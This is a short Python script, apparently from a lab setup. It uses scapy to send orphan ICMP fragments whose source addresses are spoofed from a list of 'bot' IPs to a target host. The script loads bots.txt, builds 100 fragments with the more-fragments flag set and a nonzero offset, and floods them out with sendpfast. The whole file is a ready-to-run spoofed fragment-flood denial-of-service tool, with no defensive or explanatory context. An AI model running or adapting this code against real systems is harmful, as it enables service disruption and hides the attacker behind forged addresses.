from scapy.all import *
import random
import time
import ipaddress

TARGET_IP = "192.168.100.2"
BOTFILE = "bots.txt"

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_icmp_orphan_fragment():
    bot_ips = load_bots(BOTFILE)
    lista_de_pacotes = []

    # Parâmetros de fragmentação “falsa”
    for _ in range(100):
        source_ip = random.choice(bot_ips)
        eth_layer = Ether()
        # Criando um fragmento isolado (não haverá reassembly, pois os outros não serão enviados)
        frag = IP(src=source_ip, dst=TARGET_IP, flags="MF", frag=10)/ICMP(type=8, code=0)/Raw(b'FRAGPART')
        lista_de_pacotes.append(eth_layer / frag)

    start_time = time.perf_counter()
    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nEnvio concluído (fragmentos órfãos enviados).")
    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")

if __name__ == "__main__":
    run_icmp_orphan_fragment()
